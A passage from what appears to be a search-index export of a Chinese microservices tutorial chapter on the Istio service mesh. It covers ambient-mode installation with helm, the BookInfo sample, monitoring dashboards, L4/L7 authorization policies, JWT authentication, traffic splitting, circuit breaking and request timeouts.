\u4ee3\u7406\uff0c\u800c\u4e3a\u4e86\u6027\u80fd\uff0cambient \u6a21\u5f0f\u4f7f\u7528 L4 \u4ee3\u7406\uff0c\u4f46\u662f\u53ef\u4ee5\u624b\u52a8\u628a\u4e00\u90e8\u5206\u4ee3\u7406\u5207\u6362\u5230 L7 \u4ee3\u7406\uff0c\u6765\u8865\u5168\u4e00\u4e9b\u529f\u80fd\uff0c\u4f8b\u5982\u94fe\u8def\u8ffd\u8e2a\u3002 ambient \u6a21\u5f0f\u6bd4\u8f83\u65b0\uff0c\u4e14\u6027\u80fd\u597d\uff0c\u4f46\u7f3a\u5c11\u4e00\u90e8\u5206\u7684\u529f\u80fd\u3002\u8fd9\u91cc\u6211\u4eec\u8bb2\u89e3 ambient \u6a21\u5f0f\u3002 Ambient \u6a21\u5f0f\u5b89\u88c5 \u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 istioctl install --set profile=ambient \u6765\u5b89\u88c5 istio\uff0c\u5e76\u5b89\u88c5\u597d Gaetway API\uff0c\u4f7f\u7528\uff0c kubectl get crd gateways.gateway.networking.k8s.io &> /dev/null || \\ { kubectl apply -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.1.0/standard-install.yaml; } \u4f46\u662f\u4e3a\u4e86\u65b9\u4fbf\u5347\u7ea7\u4e0e\u7ef4\u62a4\uff0c\u63a8\u8350\u4f7f\u7528 helm\u3002 \u6211\u4eec\u5148\u542f\u52a8\u4e00\u4e2a\u65b0\u7684\u96c6\u7fa4\uff0c\u7136\u540e\u5411 helm \u6dfb\u52a0\u4e00\u4e2a repo\uff0c helm repo add istio https://istio-release.storage.googleapis.com/charts \u4f7f\u7528 helm repo update \u6765\u83b7\u53d6 Chart\u3002 \u7136\u540e\u6211\u4eec\u5b89\u88c5\u7ec4\u4ef6\u5373\u53ef\u3002\u4e0e\u4f7f\u7528 istioctl \u4e0d\u540c\uff0chelm \u53ef\u4ee5\u5206\u7ec4\u4ef6\u5b89\u88c5\uff0c \u6ce8\u610f\uff0c\u8981\u5148\u5b89\u88c5\u7f51\u5173\u7684 CRD\uff0c\u7136\u540e\u518d\u5b89\u88c5\u4ee5\u4e0b\u5185\u5bb9\u3002 \u57fa\u7840\u7ec4\u4ef6\uff0c\u8fd9\u91cc\u7684 -n \u662f\u6307\u5b9a\u547d\u540d\u7a7a\u95f4\uff0c --create-namespace \u662f\u521b\u5efa\u547d\u540d\u7a7a\u95f4\uff0c --wait \u662f\u7b49\u5f85\u5b89\u88c5\u5b8c\u6210\u3002 helm install istio-base istio/base -n istio-system --create-namespace --wait CNI \u7ec4\u4ef6\uff0c\u5b83\u8d1f\u8d23\u68c0\u6d4b\u5c5e\u4e8e Ambient \u7f51\u683c\u7684 Pod\uff0c\u5e76\u914d\u7f6e Pod \u548c ztunnel \u8282\u70b9\u4ee3\u7406\uff08\u7a0d\u540e\u5c06\u5b89\u88c5\uff09\u4e4b\u95f4\u7684\u6d41\u91cf\u91cd\u5b9a\u5411\u3002 helm install istio-cni istio/cni -n istio-system --set profile=ambient --wait \u63a7\u5236\u5e73\u9762\uff0c helm install istiod istio/istiod --namespace istio-system --set profile=ambient --wait ZTunnel \u4ee3\u7406\uff0c helm install ztunnel istio/ztunnel -n istio-system --wait Ambient \u5e94\u7528\u90e8\u7f72 \u8fd9\u91cc\u6211\u4eec\u5c31\u4e0d\u81ea\u5df1\u5b9e\u73b0\u4e86\uff0c\u4f7f\u7528 istio \u7684\u793a\u4f8b\u5e94\u7528 BookInfo\uff0c\u7531\u56db\u5957\u4e0d\u540c\u8bed\u8a00\u5b9e\u73b0\u7684\u5fae\u670d\u52a1\u7ec4\u6210\u3002 \u4f7f\u7528 kubectl \u90e8\u7f72\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u6253\u5305\u6210 Chart\uff0c\u8fd9\u91cc\u4e3a\u4e86\u65b9\u4fbf\u5c31\u4e0d\u6253\u5305\u4e86\u3002 kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.23/samples/bookinfo/platform/kube/bookinfo.yaml kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.23/samples/bookinfo/platform/kube/bookinfo-versions.yaml \u7136\u540e\u914d\u7f6e\u7f51\u5173\uff0c kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.23/samples/bookinfo/gateway-api/bookinfo-gateway.yaml \u73b0\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u540c\u4ee5\u5f80\u4e00\u6837\u8bbf\u95ee\u7f51\u5173\u7684\u670d\u52a1\uff0c\u800c\u7f51\u5173\u4f1a\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230\u5bf9\u5e94\u7684\u670d\u52a1\u4e0a\u3002\u8fd9\u4e9b\u5fae\u670d\u52a1\u5e76\u6ca1\u6709\u4ec0\u4e48\u7279\u6b8a\u6027\uff0c\u4e5f\u4e0d\u9700\u8981\u989d\u5916\u64cd\u4f5c\u3002 \u7136\u540e\u6211\u4eec\u5c31\u50cf\u4e4b\u524d\u4e00\u6837\u8bbf\u95ee\u7f51\u5173\uff0c\u6253\u5f00 minikube tunnel\uff0c\u8bbf\u95ee http://localhost/productpage \uff0c\u5c31\u80fd\u770b\u5230\u9875\u9762\u3002 \u5e94\u7528\u76d1\u63a7 \u6211\u4eec\u4ecd\u7136\u9700\u8981\u5b89\u88c5 Prometheus \u548c Grafana \u6765\u76d1\u63a7\u5e94\u7528\uff0c\u4ee5\u53ca\u4f7f\u7528 Kiali Dashboard\u3002 kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.23/samples/addons/prometheus.yaml kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.23/samples/addons/grafana.yaml kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.23/samples/addons/kiali.yaml \u7136\u540e\u4f7f\u7528 istioctl dashboard kiali \u6765\u6253\u5f00 Kiali Dashboard\u3002 \u7136\u540e\u6211\u4eec\u53d1\u9001\u4e00\u4e9b\u8bf7\u6c42\uff0c for i in $(seq 1 100); do curl -s http://localhost:8080/productpage; done \u7136\u540e\u6211\u4eec\u80fd\u5728 Kiali Dashboard \u4e0a\u770b\u5230\u8bf7\u6c42\u7684\u6d41\u91cf\u3002 \u4f46\u662f\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\u4e00\u4e2a\u95ee\u9898\uff1a\u53ea\u6709 productpage \u670d\u52a1\u6709\u6d41\u91cf\u3002\u8fd9\u662f\u56e0\u4e3a\uff0c\u6211\u4eec\u7684\u5fae\u670d\u52a1\u6ca1\u6709\u5728\u6570\u636e\u5e73\u9762\u6ce8\u518c\uff0c\u56e0\u6b64 istio \u65e0\u6cd5\u76d1\u63a7\u5230\u8fd9\u4e9b\u670d\u52a1\u3002 \u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u628a\u4e00\u6574\u4e2a namespace \u52a0\u5165\u5230 istio \u7684\u6570\u636e\u5e73\u9762\u4e2d\uff0c kubectl label namespace default istio.io/dataplane-mode=ambient \u73b0\u5728\uff0c\u6211\u4eec\u5c31\u80fd\u770b\u5230\u6240\u6709\u7684\u670d\u52a1\u4e86\u3002 \u6211\u4eec\u4e5f\u53ef\u4ee5\u5728 Mesh \u9875\u9762\u67e5\u770b\u6211\u4eec\u7684\u670d\u52a1\u7f51\u683c\u3002 L4 \u9274\u6743 \u6ce8\u610f\uff0c\u8fd9\u91cc\u7684\u9274\u6743\u662f\u4ee5 Pod \u4e3a\u5355\u4f4d\u7684\uff0c\u800c\u4e0d\u662f\u7528\u6237\u3002 \u4e0b\u9762\u7684\u7528\u6237\u521b\u5efa\u7b49\u8fc7\u7a0b\u5728\u793a\u4f8b\u4e2d\u5df2\u7ecf\u6709\u4e86\uff0c\u4e0d\u9700\u8981\u6211\u4eec\u64cd\u4f5c\uff0c\u8fd9\u91cc\u4ec5\u8fdb\u884c\u4ecb\u7ecd\u3002 \u9274\u6743\u662f\u57fa\u4e8e ServiceAccount \u7684\uff0c apiVersion: v1 kind: ServiceAccount metadata: name: bookinfo-productpage labels: account: productpage \u8981\u628a ServiceAccount \u4e0e Pod \u7ed1\u5728\u4e00\u8d77\u3002 apiVersion: apps/v1 kind: Deployment metadata: name: productpage-v1 labels: app: productpage version: v1 spec: # ... template: metadata: # ... spec: serviceAccountName: bookinfo-productpage # ... \u7136\u540e\u521b\u5efa AuthorizationPolicy\uff0c apiVersion: security.istio.io/v1 kind: AuthorizationPolicy metadata: name: productpage-viewer namespace: default spec: selector: matchLabels: app: productpage action: ALLOW rules: - from: - source: principals: - cluster.local/ns/default/sa/bookinfo-gateway-istio \u8fd9\u91cc\u7684 principal \u662f\u5141\u8bb8\u8bbf\u95ee\u7684 ServiceAccount\u3002 bookinfo-gateway-istio \u662f istio \u9ed8\u8ba4\u7684\u7f51\u5173\u670d\u52a1\u8d26\u6237\u3002principals \u7684\u683c\u5f0f\u662f\uff0c {cluster-name}/ns/{namespace}/sa/{service-account} cluster-name \u662f\u96c6\u7fa4\u7684\u540d\u5b57\uff0c\u9ed8\u8ba4\u662f cluster.local \u3002ns \u4ee3\u8868 namespace\uff0cnamespace \u586b\u5165 ServiceAccount \u6240\u5728\u7684 namespace\u3002sa \u4ee3\u8868 ServiceAccount\uff0c\u6700\u540e\u52a0\u4e0a ServiceAccount \u7684\u540d\u5b57\u3002 \u73b0\u5728\uff0c\u53ea\u5141\u8bb8 bookinfo-gateway-istio \u8bbf\u95ee productpage \u670d\u52a1\uff0c\u5373\u5fc5\u987b\u901a\u8fc7\u7f51\u5173\u3002\u6211\u4eec\u53ef\u4ee5\u968f\u610f\u8fdb\u5165\u4e00\u4e2a Pod\uff0c\u8fd0\u884c curl -s \"http://productpage:9080/productpage\" \uff0c\u4f1a\u53d1\u73b0\u65e0\u6cd5\u8bbf\u95ee\u3002 L7 \u9274\u6743 \u524d\u9762\u7684 L4 \u9274\u6743\u53ea\u80fd\u5728 OSI \u7b2c\u56db\u5c42\uff0c\u5373\u4f20\u8f93\u5c42\uff0cTCP/UDP \u534f\u8bae\u3002\u800c L7 \u9274\u6743\u53ef\u4ee5\u5728 OSI \u7b2c\u4e03\u5c42\uff0c\u5373\u5e94\u7528\u5c42\uff0cHTTP \u534f\u8bae\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u7ea6\u675f\u66f4\u591a\u7684\u5185\u5bb9\uff0c\u4f8b\u5982\u8bf7\u6c42\u5934\u3001\u8bf7\u6c42\u4f53\u7b49\uff0c\u56e0\u6b64\u53ef\u4ee5\u652f\u6301 OAuth2\uff0cJWT \u7b49\u7b49\u3002 \u8981\u5728 Ambient \u6a21\u5f0f\u6253\u5f00 L7 \u9274\u6743\uff0c\u9700\u8981\u628a\u9ed8\u8ba4\u7684 L4 Envoy \u4ee3\u7406\u66ff\u6362\u4e3a L7 Waypoint \u4ee3\u7406\u3002\u53ea\u8981\u521b\u5efa waypoint \u5bf9\u8c61\uff0c waypoint \u662f\u7279\u6b8a\u7684 Gateway\u3002\u8fd9\u4e2a waypoint \u4f1a\u4ee3\u7406\u6240\u6709\u901a\u8fc7\u5f53\u524d namespace \u7684\u6d41\u91cf\u3002 apiVersion: gateway.networking.k8s.io/v1 kind: Gateway metadata: labels: istio.io/waypoint-for: service name: waypoint spec: gatewayClassName: istio-waypoint listeners: - name: mesh port: 15008 protocol: HBONE \u8fd9\u91cc\u7684 listeners \u6211\u4eec\u4e0d\u9700\u8981\u5173\u5fc3\u3002\u5728\u8fd9\u4e2a listener \u4e0a\uff0c\u53ef\u4ee5\u5728 L4 \u57fa\u7840\u4e0a\u5efa\u7acb L7 \u4ee3\u7406\u3002 \u7136\u540e\u6211\u4eec\u4fee\u6539 Policy\uff0c apiVersion: security.istio.io/v1 kind: AuthorizationPolicy metadata: name: productpage-viewer namespace: default spec: targetRefs: - kind: Service group: \"\" name: productpage action: ALLOW rules: - from: - source: principals: - cluster.local/ns/default/sa/sleep to: - operation: methods: [\"GET\"] \u8fd9\u91cc\u6211\u4eec\u7ea6\u675f\u4e86\u53ea\u5141\u8bb8\u8bbf\u95ee productpage \u670d\u52a1\u7684 GET \u65b9\u6cd5\u3002\u5982\u679c\u4f7f\u7528\uff0c kubectl exec deploy/reviews-v1 -- curl -s http://productpage:9080/productpage \u53ef\u4ee5\u770b\u5230\uff0caccess denied\u3002 \u5982\u679c\u5e0c\u671b\u4f7f\u7528\uff0c\u4f8b\u5982\uff0cJWT \u9274\u6743\uff0c\u53ef\u4ee5\u4f7f\u7528 RequestAuthentication \u5bf9\u8c61\uff0c apiVersion: security.istio.io/v1 kind: RequestAuthentication metadata: name: \"jwt-example\" namespace: foo spec: selector: matchLabels: app: httpbin jwtRules: - issuer: \"testing@secure.istio.io\" jwksUri: \"https://raw.githubusercontent.com/istio/istio/release-1.23/security/tools/jwt/samples/jwks.json\" \u7136\u540e\u628a\u4e4b\u524d\u7684 principal \u6539\u6210\u8bf7\u6c42 principal\u3002 apiVersion: security.istio.io/v1 kind: AuthorizationPolicy metadata: name: require-jwt namespace: foo spec: selector: matchLabels: app: httpbin action: ALLOW rules: - from: - source: requestPrincipals: [\"testing@secure.istio.io/testing@secure.istio.io\"] \u8fd9\u91cc\u6211\u4eec\u5c31\u4e0d\u518d\u8be6\u7ec6\u4ecb\u7ecd\u4e86\u3002 \u6d41\u91cf\u7ba1\u7406 \u6211\u4eec\u53ef\u4ee5\u5728 HTTPRoute \u4e2d\u914d\u7f6e\u6d41\u91cf\u7ba1\u7406\uff0c\u4f8b\u5982\uff0c apiVersion: gateway.networking.k8s.io/v1 kind: HTTPRoute metadata: name: reviews spec: parentRefs: - group: \"\" kind: Service name: reviews port: 9080 rules: - backendRefs: - name: reviews-v1 port: 9080 weight: 90 - name: reviews-v2 port: 9080 weight: 10 \u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u5f97 90% \u7684\u6d41\u91cf\u8bbf\u95ee reviews-v1\uff0c10% \u7684\u6d41\u91cf\u8bbf\u95ee reviews-v2\u3002 \u7194\u65ad \u53ef\u4ee5\u901a\u8fc7 DestinationRule \u6765\u914d\u7f6e\u7194\u65ad\uff0c apiVersion: networking.istio.io/v1 kind: DestinationRule metadata: name: httpbin spec: host: httpbin trafficPolicy: connectionPool: tcp: maxConnections: 1 http: http1MaxPendingRequests: 1 maxRequestsPerConnection: 1 outlierDetection: consecutive5xxErrors: 1 interval: 1s baseEjectionTime: 3m maxEjectionPercent: 100 \u8fd9\u91cc\u7684\u53c2\u6570\u53c2\u8003 \u6587\u6863 \u5373\u53ef\u3002 \u9650\u6d41 \u9650\u6d41\u53ea\u8981\u4fee\u6539 HTTPRoute\uff0c apiVersion: gateway.networking.k8s.io/v1 kind: HTTPRoute metadata: name: reviews spec: parentRefs: - group: \"\" kind: Service name: reviews port: 9080 rules: - backendRefs: - name: reviews-v2 port: 9080 timeouts: request: 500ms \u603b\u7ed3 \u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u5bf9 k8s \u672c\u8eab\u7684\u4ecb\u7ecd\u5df2\u7ecf\u7ed3\u675f\uff0c\u6211\u4eec\u5df2\u7ecf\u4ecb\u7ecd\u4e86 k8s \u7684\u57fa\u672c\u6982\u5ff5\uff0c\u5982\u4f55\u7528 k8s \u90e8\u7f72\u5e94\u7528\uff0c\u5982\u4f55\u7528 helm \u7ba1\u7406\u5e94\u7528\uff0c\u4ee5\u53ca\u5982\u4f55\u7528\u670d\u52a1\u7f51\u683c\u3002 \u7531\u6b64\uff0c\u672c\u7cfb\u5217\u4e5f\u5c31\u7ed3\u675f\u4e86\u3002\u5e0c\u671b\u8bfb\u8005\u80fd\u591f\u901a\u8fc7\u8fd9\u4e2a\u7cfb\u5217\u4e86\u89e3\u5230 Spring Cloud\uff0ck8s \u7b49\u5fae\u670d\u52a1\u6280\u672f\u3002","title":"\u670d\u52a1\u7f51\u683c"},{"location":"24/#ch24","text":"\u670d\u52a1\u7f51\u683c\uff08Service Mesh\uff09\u662f\u4e00\u79cd\u57fa\u7840\u8bbe\u65bd\u5c42\uff0c\u7528\u4e8e\u5904\u7406\u670d\u52a1\u4e4b\u95f4\u7684\u901a\u4fe1\u3002\u5b83\u63d0\u4f9b\u4e86\u4e00\u79cd\u900f\u660e\u7684\u65b9\u5f0f\uff0c\u4f7f\u5f97\u670d\u52a1\u4e4b\u95f4\u7684\u901a\u4fe1\u66f4\u52a0\u53ef\u9760\u3001\u5b89\u5168\u3001\u9ad8\u6548\u3002\u670d\u52a1\u7f51\u683c\u7684\u76ee\u6807\u662f\u89e3\u8026\u670d\u52a1\u7684\u5f00\u53d1\u548c\u8fd0\u7ef4\uff0c\u4f7f\u5f97\u670d\u52a1\u7684\u5f00\u53d1\u8005\u53ef\u4ee5\u4e13\u6ce8\u4e8e\u4e1a\u52a1\u903b\u8f91\uff0c\u800c\u8fd0\u7ef4\u8005\u53ef\u4ee5\u4e13\u6ce8\u4e8e\u670d\u52a1\u7684\u53ef\u89c2\u5bdf\u6027\u3001\u5b89\u5168\u6027\u3001\u6027\u80fd\u7b49\u65b9\u9762\u3002 \u670d\u52a1\u7f51\u683c\u5c31\u7c7b\u4f3c\u4e8e\u73b0\u5b9e\u4e2d\u7684\u8def\u7f51\uff0c\u5176\u4e2d\u6709\u9053\u8def\u548c\u4e00\u4e9b\u5fc5\u8981\u5efa\u7b51\uff08\u5982\u7ea2\u7eff\u706f\u3001\u6536\u8d39\u7ad9\u7b49\uff09\u3002\u9053\u8def\u662f\u670d\u52a1\u4e4b\u95f4\u7684\u901a\u4fe1\uff0c\u800c\u5efa\u7b51\u662f\u670d\u52a1\u7f51\u683c\u7684\u529f\u80fd\u3002\u73b0\u5728\uff0c\u4f5c\u4e3a\u57ce\u5e02\u7684\u8bbe\u8ba1\u8005\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5728\u7a7a\u683c\u91cc\u653e\u7f6e\u4e00\u4e9b\u5efa\u7b51\uff0c\u5c31\u80fd\u5efa\u9020\u51fa\u4e00\u4e2a\u57ce\u5e02\u3002\u540c\u6837\u7684\uff0c\u4f5c\u4e3a\u8f6f\u4ef6\u5f00\u53d1\u8005\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5728\u670d\u52a1\u7f51\u683c\u4e2d\u653e\u7f6e\u4e00\u4e9b\u529f\u80fd\uff0c\u5c31\u80fd\u6784\u5efa\u51fa\u4e00\u4e2a\u5fae\u670d\u52a1\u7cfb\u7edf\u3002 \u670d\u52a1\u7f51\u683c\u53c8\u79f0\u4e3a\u5fae\u670d\u52a1\u57fa\u7840\u8bbe\u65bd\uff0c\u5b83\u662f\u5fae\u670d\u52a1\u67b6\u6784\u7684\u4e00\u90e8\u5206\u3002\u670d\u52a1\u7f51\u683c\u901a\u5e38\u7531\u4e24\u90e8\u5206\u7ec4\u6210\uff1a\u6570\u636e\u5e73\u9762\uff08Data Plane\uff09\u548c\u63a7\u5236\u5e73\u9762\uff08Control Plane\uff09\u3002\u6570\u636e\u5e73\u9762\u8d1f\u8d23\u670d\u52a1\u4e4b\u95f4\u7684\u901a\u4fe1\uff0c\u63a7\u5236\u5e73\u9762\u8d1f\u8d23\u914d\u7f6e\u3001\u76d1\u63a7\u3001\u7ba1\u7406\u6570\u636e\u5e73\u9762\u3002 \u670d\u52a1\u7f51\u683c\u672c\u8eab\u4e5f\u662f\u4e00\u4e2a\u5fae\u670d\u52a1\uff0c\u5b83\u7531\u4e00\u4e9b\u5fae\u670d\u52a1\u7ec4\u6210\uff0c\u8fd9\u4e9b\u5fae\u670d\u52a1\u8d1f\u8d23\u670d\u52a1\u7f51\u683c\u7684\u5404\u4e2a\u529f\u80fd\u3002\u56e0\u6b64\uff0c\u90e8\u7f72\u5b83\u4eec\u662f\u5f88\u590d\u6742\u7684\u3002\u4e0d\u8fc7\uff0c\u524d\u9762\u6211\u4eec\u4ecb\u7ecd\u8fc7 helm\uff0chelm \u53ef\u4ee5\u4e00\u6b21\u90e8\u7f72\u4e00\u6574\u4e2a k8s \u96c6\u7fa4\uff0c\u56e0\u6b64\u4e5f\u53ef\u4ee5\u4e00\u6b21\u90e8\u7f72\u4e00\u4e2a\u670d\u52a1\u7f51\u683c\u3002 \u670d\u52a1\u7f51\u683c\u7684\u5177\u4f53\u4f7f\u7528\u6839\u636e\u63d0\u4f9b\u5546\u6709\u4e9b\u8bb8\u4e0d\u540c\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 istio \u4f5c\u4e3a\u670d\u52a1\u7f51\u683c\uff0c\u5b83\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u670d\u52a1\u7f51\u683c\uff0c\u7531 Google\u3001IBM \u548c Lyft \u5171\u540c\u5f00\u53d1\u3002istio \u63d0\u4f9b\u4e86\u4e00\u4e9b\u529f\u80fd\uff0c\u5982\u6d41\u91cf\u7ba1\u7406\u3001\u5b89\u5168\u3001\u76d1\u63a7\u7b49\u3002 \u524d\u9762\u6211\u4eec\u5728\u4ecb\u7ecd\u7f51\u5173\u65f6\u5df2\u7ecf\u4f7f\u7528\u4e86 istio \u7684\u7f51\u5173\uff0c\u5f53\u65f6\u5728\u5b89\u88c5\u65f6\u6211\u4eec\u4e8b\u5b9e\u4e0a\u5df2\u7ecf\u5b89\u88c5\u4e86 istio \u670d\u52a1\u7f51\u683c\u7684\u4e00\u90e8\u5206\u3002\u8fd9\u4e00\u7ae0\u6211\u4eec\u7cfb\u7edf\u5730\u4ecb\u7ecd\u4e00\u4e0b istio \u7684\u670d\u52a1\u7f51\u683c\u3002","title":"\u5fae\u670d\u52a1\u901f\u6210 Ch24 \u670d\u52a1\u7f51\u683c"},{"location":"24/#_1","text":"\u901a\u8fc7\u524d\u9762\u7684\u5b66\u4e60\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u5fae\u670d\u52a1\u9700\u8981\u8bb8\u591a\u529f\u80fd\uff0c\u800c k8s \u548c Spring Cloud \u533a\u522b\u662f\uff0c\u524d\u8005\u662f\u975e\u4fb5\u5165\u7684\uff0c\u4ee3\u7801\u4e2d\u611f\u77e5\u4e0d\u5230 k8s \u7684\u5b58\u5728\uff0c\u800c\u540e\u8005\u662f\u4fb5\u5165\u7684\uff0c\u4ee3\u7801\u4e2d\u9700\u8981\u4f7f\u7528 Spring Cloud \u7684 API\u3002 \u670d\u52a1\u7f51\u683c\u63d0\u4f9b\u4e86\u5fae\u670d\u52a1\u7684\u5927\u90e8\u5206\u529f\u80fd\uff0c\u4e0d\u518d\u9700\u8981\u81ea\u5df1\u642d\u5efa\uff0c\u5176\u4e2d\u4e3b\u8981\u6709\uff0c \u5b89\u5168\u8ba4\u8bc1\u548c\u9274\u6743 \u8d1f\u8f7d\u5747\u8861 \u6d41\u91cf\u7ba1\u7406 \u8bbf\u95ee\u63a7\u5236 \u94fe\u8def\u8ffd\u8e2a \u8fd9\u6db5\u76d6\u4e86\u4e4b\u524d\u4f7f\u7528 Spring Cloud \u8bb2\u5230\u7684\u5927\u90e8\u5206\u529f\u80fd\u3002\u5fae\u670d\u52a1\u7684\u5176\u5b83\u529f\u80fd\uff0c\u670d\u52a1\u6ce8\u518c\u3001\u914d\u7f6e\u4e0e\u7ba1\u7406\u7531 k8s \u63d0\u4f9b\uff0c\u5206\u5e03\u5f0f\u4e8b\u52a1\u4ecd\u7136\u9700\u8981\u989d\u5916\u7684\u7ec4\u4ef6\u3002 \u670d\u52a1\u7f51\u683c\u7684\u8fd9\u4e9b\u529f\u80fd\u901a\u8fc7\u4ee3\u7406\u5b9e\u73b0\u3002\u670d\u52a1\u7f51\u683c\u4e2d\u7684\u6bcf\u4e2a\u5fae\u670d\u52a1\u90fd\u6709\u4e00\u4e2a\u4ee3\u7406\uff0c\u62e6\u622a\u6240\u6709\u7684\u7f51\u7edc\u6d41\u6d6a\uff0c\u5e76\u8d1f\u8d23\u670d\u52a1\u4e4b\u95f4\u7684\u901a\u4fe1\u3002\u8fd9\u4e2a\u4ee3\u7406\u662f\u900f\u660e\u7684\uff0c\u5fae\u670d\u52a1\u4e0d\u9700\u8981\u5173\u5fc3\u8fd9\u4e2a\u4ee3\u7406\u7684\u5b58\u5728\u3002\u8fd9\u4e2a\u4ee3\u7406\u8d1f\u8d23\u8d1f\u8f7d\u5747\u8861\u3001\u6545\u969c\u6062\u590d\u3001\u6d41\u91cf\u7ba1\u7406\u7b49\u3002 \u4ee3\u7406\u53ef\u5206\u4e3a\u4e24\u79cd\uff0cL4 \u4ee3\u7406\u548c L7 \u4ee3\u7406\uff0c\u5206\u522b\u5bf9\u5e94 OSI \u6a21\u578b\u7684\u7b2c\u56db\u5c42\u548c\u7b2c\u4e03\u5c42\u3002L4 \u4ee3\u7406\u529f\u80fd\u6bd4\u8f83\u5c11\uff0c\u4f46\u6027\u80fd\u597d\uff0cL7 \u4ee3\u7406\u529f\u80fd\u591a\uff0c\u4f46\u6027\u80fd\u5dee\u3002 \u670d\u52a1\u7f51\u683c\u53ef\u4ee5\u5728\u903b\u8f91\u4e0a\u5206\u6210\u4e24\u4e2a\u5e73\u9762\uff0c \u6570\u636e\u5e73\u9762\u662f\u4e00\u7cfb\u5217\u7684\u7f51\u7edc\u4ee3\u7406\uff0c\u7528\u6765\u534f\u8c03\u548c\u76d1\u63a7\u5fae\u670d\u52a1\u4e4b\u95f4\u7684\u901a\u4fe1\u3002\u8fd9\u4e9b\u4ee3\u7406\u662f\u90e8\u7f72\u5728\u6bcf\u4e2a\u5fae\u670d\u52a1\u4e4b\u95f4\u7684\uff0c\u5b83\u4eec\u8d1f\u8d23\u670d\u52a1\u4e4b\u95f4\u7684\u901a\u4fe1\u3001\u8d1f\u8f7d\u5747\u8861\u3001\u6545\u969c\u6062\u590d\u7b49\u3002\u8fd9\u4e9b\u4ee3\u7406\u662f\u900f\u660e\u7684\uff0c\u5fae\u670d\u52a1\u4e0d\u9700\u8981\u5173\u5fc3\u8fd9\u4e9b\u4ee3\u7406\u7684\u5b58\u5728\u3002 \u63a7\u5236\u5e73\u9762\u662f\u4e00\u7cfb\u5217\u7684\u5fae\u670d\u52a1\uff0c\u7528\u6765\u7ba1\u7406\u6570\u636e\u5e73\u9762\u3002 istio \u7684\u6570\u636e\u5e73\u9762\u6709\u4e24\u79cd\u5de5\u4f5c\u6a21\u5f0f\uff0csidecar \u548c ambient\u3002sidecar \u5373\u4fa7\u8f7d\uff0c\u662f\u5c06\u4ee3\u7406\u90e8\u7f72\u5728\u6bcf\u4e2a\u5fae\u670d\u52a1\u7684 Pod \u4e2d\uff0c\u8fd9\u662f istio \u7684\u9ed8\u8ba4\u5de5\u4f5c\u6a21\u5f0f\u3002ambient \u5373\u73af\u5883\uff0c\u662f\u5c06\u4ee3\u7406\u90e8\u7f72\u5728 Pod \u7684\u73af\u5883\u4e2d\uff0c\u8fd9\u662f istio \u7684\u53e6\u4e00\u79cd\u5de5\u4f5c\u6a21\u5f0f\u3002 sidecar \u6a21\u5f0f\u9ed8\u8ba4\u4f7f\u7528 L7 \u4ee3\u7406\uff0c\u800c\u4e3a\u4e86\u6027\u80fd\uff0cambient \u6a21\u5f0f\u4f7f\u7528 L4 \u4ee3\u7406\uff0c\u4f46\u662f\u53ef\u4ee5\u624b\u52a8\u628a\u4e00\u90e8\u5206\u4ee3\u7406\u5207\u6362\u5230 L7 \u4ee3\u7406\uff0c\u6765\u8865\u5168\u4e00\u4e9b\u529f\u80fd\uff0c\u4f8b\u5982\u94fe\u8def\u8ffd\u8e2a\u3002 ambient \u6a21\u5f0f\u6bd4\u8f83\u65b0\uff0c\u4e14\u6027\u80fd\u597d\uff0c\u4f46\u7f3a\u5c11\u4e00\u90e8\u5206\u7684\u529f\u80fd\u3002\u8fd9\u91cc\u6211\u4eec\u8bb2\u89e3 ambient \u6a21\u5f0f\u3002","title":"\u670d\u52a1\u7f51\u683c\u7684\u7ed3\u6784\u4e0e\u539f\u7406"},{"location":"24/#ambient","text":"\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 istioctl install --set profile=ambient \u6765\u5b89\u88c5 istio\uff0c\u5e76\u5b89\u88c5\u597d Gaetway API\uff0c\u4f7f\u7528\uff0c kubectl get crd gateways.gateway.networking.k8s.io &> /dev/null || \\ { kubectl apply -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.1.0/standard-install.yaml; } \u4f46\u662f\u4e3a\u4e86\u65b9\u4fbf\u5347\u7ea7\u4e0e\u7ef4\u62a4\uff0c\u63a8\u8350\u4f7f\u7528 helm\u3002 \u6211\u4eec\u5148\u542f\u52a8\u4e00\u4e2a\u65b0\u7684\u96c6\u7fa4\uff0c\u7136\u540e\u5411 helm \u6dfb\u52a0\u4e00\u4e2a repo\uff0c helm repo add istio https://istio-release.storage.googleapis.com/charts \u4f7f\u7528 helm repo update \u6765\u83b7\u53d6 Chart\u3002 \u7136\u540e\u6211\u4eec\u5b89\u88c5\u7ec4\u4ef6\u5373\u53ef\u3002\u4e0e\u4f7f\u7528 istioctl \u4e0d\u540c\uff0chelm \u53ef\u4ee5\u5206\u7ec4\u4ef6\u5b89\u88c5\uff0c \u6ce8\u610f\uff0c\u8981\u5148\u5b89\u88c5\u7f51\u5173\u7684 CRD\uff0c\u7136\u540e\u518d\u5b89\u88c5\u4ee5\u4e0b\u5185\u5bb9\u3002 \u57fa\u7840\u7ec4\u4ef6\uff0c\u8fd9\u91cc\u7684 -n \u662f\u6307\u5b9a\u547d\u540d\u7a7a\u95f4\uff0c --create-namespace \u662f\u521b\u5efa\u547d\u540d\u7a7a\u95f4\uff0c --wait \u662f\u7b49\u5f85\u5b89\u88c5\u5b8c\u6210\u3002 helm install istio-base istio/base -n istio-system --create-namespace --wait CNI 